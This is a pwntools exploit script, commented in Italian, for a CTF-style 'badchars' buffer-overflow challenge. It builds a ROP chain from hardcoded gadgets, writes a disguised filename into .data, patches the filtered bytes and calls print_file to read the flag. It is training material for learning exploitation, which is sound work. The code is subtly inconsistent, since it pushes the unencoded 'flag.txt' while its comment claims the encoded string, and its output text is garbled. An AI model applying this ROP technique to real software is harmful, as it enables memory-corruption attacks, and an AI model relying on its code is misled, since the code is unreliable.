from pwn import *
from pprint import pprint
import warnings

warnings.filterwarnings("ignore")
# context.binary = elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')

offset = 40
bad_str = 'flag.txt'
not_so_bad_str = 'fl`f-twt'

elf = context.binary = ELF("./badchars")

rop = ROP(elf)

p = elf.process()

badchars = { 
    'x' : 'x'.encode("utf-8").hex() ,
    'g' : 'g'.encode("utf-8").hex() ,
    'a' : 'a'.encode("utf-8").hex() ,
    '.' : '.'.encode("utf-8").hex()
}

# pprint(badchars)
# pprint(elf.symbols)
p.recvuntil("badchars are: 'x', 'g', 'a', '.'\n")

where_to_write = int(hex(0x60102f),0) # sezione trovata con readelf, .data  -> privilegi WA (write) (indirizzo con offset diverso per evitare di andare sul badchar \x2e)
pop_gadget = int(hex(0x40069c),0) # trovato con ROPgadget 
mov_gadget = int(hex(0x400634),0) # trovato con ROPgadget 
add_gadget = int(hex(0x40062c),0) # trovato con ROPgadget 

log.info(f"Badchar con relativa conversione in esadecimale : {badchars}")
log.info(f"Trovato gadget pop utile al seguente indirizzo : {hex(pop_gadget)}")
log.info(f"Trovato gadget mov utile al seguente indirizzo : {hex(mov_gadget)}")
log.info(f"Trovato gadget add utile al seguente indirizzo : {hex(add_gadget)}")
log.info(f"Indirizzo su cui possiamo scrivere in memoria : {hex(where_to_write)}")

rop.raw(pop_gadget)         # pop r12; pop r13; pop r14; pop r15; ret
rop.raw(bad_str)     # r12 = fl`f-twt
rop.raw(where_to_write)     # r13 = 0x60102f
rop.raw(int(hex(0x01),0))   # r14 = 0x01
rop.raw(where_to_write)     # r15 = 0x60102f
rop.raw(mov_gadget)         # mov qword ptr [r13], r12 ; ret

# metodo alternativo creazione rop.chain 

# rop.r12 = not_so_bad_str
# rop.r13 = where_to_write
# rop.raw(mov_gadget)
# rop.r14 = int(hex(0x01),0)
# rop.r15 = where_to_write

c = 0
while (c < len(not_so_bad_str)) :
    if bad_str[c] in badchars :
        rop.r15 = where_to_write + c        # pop r15; ret
        # rop.raw(int(hex(0x4006a2),0)) = where_to_write + c        #versione alternativa a sopra (pop r15 ; ret )
        rop.raw(add_gadget)
    c += 1 
    

rop.rdi = where_to_write
rop.raw(elf.symbols["print_file"])

# rop.call("print_file". where_to_write) # soluzione alternativa alla rop.rdi + rop.raw

payload = [    
    b"." * offset, 
    rop.chain()
]

payload = b"".join(payload)
ui.pause()
p.send(payload)

# print(rop.dump())

p.recvline()

flag = p.recvline()

log.info(f"Questa Ã¨ la flag : {flag.decode('utf-8')}")

# libc = elf.libc

# p = connect('spclr.ch', 1337)
